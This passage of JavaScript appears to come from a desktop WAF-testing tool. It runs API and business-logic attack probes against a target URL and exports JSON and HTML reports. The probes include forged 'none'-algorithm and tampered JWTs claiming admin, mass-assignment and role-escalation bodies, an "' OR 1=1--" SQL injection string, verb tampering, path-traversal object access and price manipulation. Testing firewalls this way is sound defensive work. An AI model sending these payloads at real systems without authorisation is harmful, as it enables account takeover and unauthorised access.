    { id:'api-4',  name:'JWT None Algorithm',              tags:['OWASP:A02','CWE-347','NIST:IA-5','PCI:6.4'], fn: ()=>doGet({'Authorization':'Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0.'}) },
    { id:'api-5',  name:'JWT Algorithm Confusion (RS->HS)',tags:['OWASP:A02','CWE-347','NIST:IA-5'],           fn: ()=>doGet({'Authorization':'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0.TAMPERED'}) },
    { id:'api-6',  name:'Mass Assignment (role escalation)',tags:['OWASP:A03','CWE-915','NIST:AC-3','PCI:6.4'],fn: ()=>doPost('{"username":"test","password":"test","role":"admin","isAdmin":true}') },
    { id:'api-7',  name:'HTTP Verb Tampering (DELETE)',     tags:['OWASP:A01','CWE-284','NIST:AC-3'],           fn: ()=>doVerb('DELETE') },
    { id:'api-8',  name:'HTTP Verb Tampering (PUT)',        tags:['OWASP:A01','CWE-284','NIST:AC-3'],           fn: ()=>doVerb('PUT') },
    { id:'api-9',  name:'BOLA - Object Level Auth Bypass', tags:['OWASP:A01','CWE-639','NIST:AC-3','PCI:6.4'],fn: ()=>doGet({}, parsed.pathname.replace(/\/\d+/,'/1')+'/../2') },
    { id:'api-10', name:'Content-Type Confusion Attack',   tags:['OWASP:A03','CWE-436','NIST:SI-10'],          fn: async ()=>{
      const opts = buildOptions(targetUrl,{method:'POST'},runOptions);
      const body = "' OR 1=1--";
      opts.headers['Content-Type']='text/plain'; opts.headers['Content-Length']=Buffer.byteLength(body);
      const res = await makeProxiedRequest(opts, body, runOptions);
      return { status:res.status, latency:res.latency, ...evaluateBlock(res,baseline) };
    }},
  ];

  const results = [];
  for (let i = 0; i < rawTests.length; i++) {
    const t = rawTests[i];
    sendProgress({ current: i + 1, total: rawTests.length, name: t.name });
    const r = await t.fn();
    results.push({ id:t.id, name:t.name, category:'API Security', tags:t.tags, payload:t.name,
      status:r.status, latency:r.latency, blocked:r.blocked, confidence:r.confidence, reason:r.reason });
    await sleep(300);
  }
  return results;
}

// 6. Business Logic Tests
async function runBusinessLogicTests(targetUrl, sendProgress, runOptions, baseline) {
  runOptions = runOptions || {};
  const parsed = new URL(targetUrl);

  const doPost = async (path, body) => {
    const opts = buildOptions(targetUrl, {method:'POST'}, runOptions);
    opts.path = path; opts.headers['Content-Type']='application/json'; opts.headers['Content-Length']=Buffer.byteLength(body);
    const res = await makeProxiedRequest(opts, body, runOptions);
    return { status:res.status, latency:res.latency, ...evaluateBlock(res,baseline) };
  };
  const doGet = async (path) => {
    const opts = buildOptions(targetUrl,{},runOptions); opts.path = path;
    const res = await makeProxiedRequest(opts, null, runOptions);
    return { status:res.status, latency:res.latency, ...evaluateBlock(res,baseline) };
  };

  const rawTests = [
    { id:'bl-1', name:'Negative Quantity (price manipulation)',   tags:['OWASP:A01','CWE-840','NIST:AC-3','PCI:6.4'], fn:()=>doPost(parsed.pathname,'{"item_id":1,"quantity":-1,"price":9.99}') },
    { id:'bl-2', name:'Zero-price product submission',            tags:['OWASP:A01','CWE-840','NIST:AC-3','PCI:6.4'], fn:()=>doPost(parsed.pathname,'{"item_id":1,"quantity":1,"price":0.00}') },
    { id:'bl-3', name:'Admin endpoint direct access',             tags:['OWASP:A01','CWE-284','NIST:AC-3','PCI:6.4'], fn:()=>doGet(parsed.pathname+'/admin') },
    { id:'bl-4', name:'HTTP Parameter Pollution (role dup)',       tags:['OWASP:A01','CWE-235','NIST:SI-10'],          fn: async()=>{ const url=new URL(targetUrl); url.searchParams.append('role','user'); url.searchParams.append('role','admin'); const opts=buildOptions(url.toString(),{},runOptions); const res=await makeProxiedRequest(opts, null, runOptions); return {status:res.status,latency:res.latency,...evaluateBlock(res,baseline)}; } },
    { id:'bl-5', name:'Account Enumeration (timing probe)',        tags:['OWASP:A07','CWE-204','NIST:IA-5','PCI:6.4'], fn:()=>doPost(parsed.pathname,'{"username":"admin@example.com","password":"wrongpassword123"}') },
    { id:'bl-6', name:'Excessive Data Exposure (verbose error)',   tags:['OWASP:A02','CWE-209','NIST:SI-11'],          fn:()=>doGet(parsed.pathname+'/user/99999999') },
    { id:'bl-7', name:'Forced Browsing - hidden endpoint',         tags:['OWASP:A01','CWE-284','NIST:AC-3','PCI:6.4'], fn:()=>doGet(parsed.pathname+'/internal/health') },
    { id:'bl-8', name:'Privilege Escalation via role parameter',   tags:['OWASP:A01','CWE-269','NIST:AC-6','PCI:6.4'], fn:()=>doPost(parsed.pathname,'{"user_id":42,"role":"superadmin","action":"elevate"}') },
  ];

  const results = [];
  for (let i = 0; i < rawTests.length; i++) {
    const t = rawTests[i];
    sendProgress({ current: i + 1, total: rawTests.length, name: t.name });
    const r = await t.fn();
    results.push({ id:t.id, name:t.name, category:'Business Logic', tags:t.tags, payload:t.name,
      status:r.status, latency:r.latency, blocked:r.blocked, confidence:r.confidence, reason:r.reason });
    await sleep(250);
  }
  return results;
}

function sleep(ms) {
  return new Promise(r => setTimeout(r, ms));
}

// ══════════════════════════════════════════════
// IPC Handlers
// ══════════════════════════════════════════════

ipcMain.handle('run-tests', async (event, { url, suites, options }) => {
  const allResults = {};
  uaIndex = 0; // reset UA rotation each run

  const runOptions = {
    rotateUA:      options?.rotateUA      ?? true,
    sendWafHeader: options?.sendWafHeader ?? false,
    useBaseline:   options?.useBaseline   ?? true,
    auth:          options?.auth          ?? null,
    // Burp / HTTP proxy support — only active when enabled: true is passed
    proxy: options?.proxy?.enabled ? {
      enabled: true,
      host:    options.proxy.host || '127.0.0.1',
      port:    parseInt(options.proxy.port, 10) || 8080,
    } : null,
  };

  const send = (suite, progress) => {
    mainWindow.webContents.send('test-progress', { suite, ...progress });
  };

  // Fetch baseline response (clean GET, no payload)
  let baseline = null;
  if (runOptions.useBaseline) {
    try {
      baseline = await makeProxiedRequest(buildOptions(url, {}, runOptions), null, runOptions);
    } catch (_) { baseline = null; }
  }

  try {
    if (suites.includes('owasp')) {
      allResults.owasp = await runOwaspTests(url, p => send('owasp', p), runOptions, baseline);
    }
    if (suites.includes('ratelimit')) {
      allResults.ratelimit = await runRateLimitTests(url, p => send('ratelimit', p), runOptions);
    }
    if (suites.includes('bot')) {
      allResults.bot = await runBotTests(url, p => send('bot', p), runOptions, baseline);
    }
    if (suites.includes('bypass')) {
      allResults.bypass = await runBypassTests(url, p => send('bypass', p), runOptions, baseline);
    }
    if (suites.includes('api')) {
      allResults.api = await runApiTests(url, p => send('api', p), runOptions, baseline);
    }
    if (suites.includes('bizlogic')) {
      allResults.bizlogic = await runBusinessLogicTests(url, p => send('bizlogic', p), runOptions, baseline);
    }
  } catch (err) {
    return { error: err.message };
  }

  return { results: allResults, baseline: baseline ? { status: baseline.status, latency: baseline.latency } : null };
});

ipcMain.handle('export-report', async (event, { results, url }) => {
  const { filePath } = await dialog.showSaveDialog(mainWindow, {
    title: 'Save WAF Report',
    defaultPath: `waf-report-${Date.now()}.json`,
    filters: [
      { name: 'JSON Report', extensions: ['json'] },
      { name: 'All Files', extensions: ['*'] }
    ]
  });

  if (!filePath) return { cancelled: true };

  const report = {
    tool: 'WAF Tester v1.0',
    target: url,
    timestamp: new Date().toISOString(),
    summary: buildSummary(results),
    results
  };

  fs.writeFileSync(filePath, JSON.stringify(report, null, 2));
  return { saved: true, path: filePath };
});

ipcMain.handle('export-html-report', async (event, { results, url }) => {
  const { filePath } = await dialog.showSaveDialog(mainWindow, {
    title: 'Save HTML Report',
    defaultPath: `waf-report-${Date.now()}.html`,
    filters: [{ name: 'HTML Report', extensions: ['html'] }]
  });

  if (!filePath) return { cancelled: true };

  const html = generateHtmlReport(results, url);
  fs.writeFileSync(filePath, html);
  shell.openPath(filePath);
  return { saved: true, path: filePath };
});

function buildSummary(results) {
  const summary = {};
  for (const [suite, tests] of Object.entries(results)) {
    const total = tests.length;
    const blocked = tests.filter(t => t.blocked === true).length;
    const passed = tests.filter(t => t.blocked === false).length;
    const errors = tests.filter(t => t.blocked === null).length;
    summary[suite] = { total, blocked, passed, errors, score: Math.round((blocked / total) * 100) };
  }
  return summary;
}

function generateHtmlReport(results, targetUrl) {
  const summary = buildSummary(results);
  const now = new Date().toLocaleString();

  const suiteNames = { owasp: 'OWASP Top 10', ratelimit: 'Rate Limiting', bot: 'Bot Detection', bypass: 'Bypass Attempts' };

  let tableRows = '';
  for (const [suite, tests] of Object.entries(results)) {
    for (const t of tests) {
      const statusClass = t.blocked === true ? 'blocked' : t.blocked === false ? 'passed' : 'error';
      const statusLabel = t.blocked === true ? '✓ BLOCKED' : t.blocked === false ? '✗ PASSED' : '? ERROR';
      tableRows += `<tr class="${statusClass}">
        <td>${suiteNames[suite] || suite}</td>
        <td>${t.name}</td>
        <td><code>${escHtml(t.payload)}</code></td>
        <td>${t.status || 'N/A'}</td>
        <td>${t.latency}ms</td>
        <td class="status-cell">${statusLabel}</td>
        <td>${escHtml(t.reason)}</td>
      </tr>`;
    }
  }

  let summaryCards = '';
  for (const [suite, s] of Object.entries(summary)) {
    const color = s.score >= 80 ? '#238636' : s.score >= 50 ? '#d29922' : '#da3633';
    summaryCards += `<div class="card">
      <h3>${suiteNames[suite] || suite}</h3>
      <div class="score" style="color:${color}">${s.score}%</div>
      <p>${s.blocked} blocked / ${s.total} total</p>
    </div>`;
  }

  return `<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>WAF Test Report</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
    background: #0d1117; color: #c9d1d9; padding: 40px; }
  h1 { color: #58a6ff; margin-bottom: 8px; }
  .meta { color: #8b949e; margin-bottom: 32px; }
  .cards { display: flex; gap: 16px; margin-bottom: 32px; flex-wrap: wrap; }
  .card { background: #161b22; border: 1px solid #30363d; border-radius: 8px;
    padding: 20px; min-width: 180px; text-align: center; }
  .card h3 { color: #58a6ff; margin-bottom: 8px; font-size: 14px; }
  .score { font-size: 36px; font-weight: 700; margin-bottom: 4px; }
  .card p { color: #8b949e; font-size: 13px; }
  table { width: 100%; border-collapse: collapse; background: #161b22;
    border-radius: 8px; overflow: hidden; border: 1px solid #30363d; }
  th { background: #1c2128; padding: 12px 16px; text-align: left;
    color: #8b949e; font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; }
  td { padding: 10px 16px; border-top: 1px solid #21262d; font-size: 13px; }
  tr.blocked td { background: rgba(35, 134, 54, 0.08); }
  tr.passed td { background: rgba(218, 55, 51, 0.08); }
  tr.error td { background: rgba(139, 148, 158, 0.08); }
  .status-cell { font-weight: 600; }
  tr.blocked .status-cell { color: #3fb950; }
  tr.passed .status-cell { color: #f85149; }
  tr.error .status-cell { color: #8b949e; }
  code { background: #1c2128; padding: 2px 6px; border-radius: 4px;
    font-family: monospace; font-size: 12px; color: #79c0ff; }
</style></head><body>
<h1>🛡️ WAF Test Report</h1>
<p class="meta">Target: <strong>${escHtml(targetUrl)}</strong> &nbsp;·&nbsp; Generated: ${now}</p>
<div class="cards">${summaryCards}</div>
<table>
<thead><tr>
  <th>Suite</th><th>Test</th><th>Payload</th>
  <th>Status</th><th>Latency</th><th>Result</th><th>Reason</th>
</tr></thead>
<tbody>${tableRows}</tbody>
</table>
</body></html>`;
}

function escHtml(str) {
  return String(str || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}
